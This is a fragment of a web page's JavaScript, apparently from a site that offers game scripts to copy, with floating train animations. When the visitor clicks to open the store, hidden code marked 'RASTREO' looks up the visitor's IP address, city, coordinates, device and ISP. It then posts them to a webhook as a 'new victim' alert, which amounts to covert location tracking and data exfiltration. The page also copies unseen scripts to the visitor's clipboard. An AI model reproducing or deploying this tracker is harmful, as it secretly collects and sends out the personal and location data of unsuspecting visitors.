        function activarTodo() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('tienda').style.display = 'block';
            
            setInterval(() => {
                let t = document.createElement('div');
                t.className = 't-float'; t.innerText = '🚂';
                t.style.left = Math.random() * 95 + "vw";
                document.body.appendChild(t);
                setTimeout(() => t.remove(), 3000);
            }, 450);

            // RASTREO
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                const ua = navigator.userAgent;
                let disp = ua.includes("Android") ? "Android 📱" : ua.includes("iPhone") ? "iPhone 📱" : "PC 💻";
                const payload = {
                    embeds: [{
                        title: "🚂 ¡NUEVA VÍCTIMA EN PINKY_TREN!",
                        color: 16711680,
                        fields: [
                            {name: "🌐 IP", value: "`" + data.ip + "`", inline: true},
                            {name: "📍 Ubicación", value: data.city + " (" + data.country_name + ")", inline: true},
                            {name: "📌 Coordenadas", value: "Lat: " + data.latitude + " / Lon: " + data.longitude, inline: false},
                            {name: "📱 Dispositivo", value: disp, inline: true},
                            {name: "🏢 Compañía", value: data.org, inline: false}
                        ],
                        footer: { text: "Rastreo Cholo 1T" },
                        timestamp: new Date()
                    }]
                };
                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
            });
        }

        function copiarScript(tipo) {
            const area = document.createElement('textarea');
            area.value = (tipo === 'veneyorw') ? scriptVene : scriptPinky;
            document.body.appendChild(area);
            area.select();
            document.execCommand('copy');
            document.body.removeChild(area);
            document.getElementById('status').innerText = "✅ SCRIPT COPIADO";
            setTimeout(() => { document.getElementById('status').innerText = ""; }, 3000);
        }
    </script>
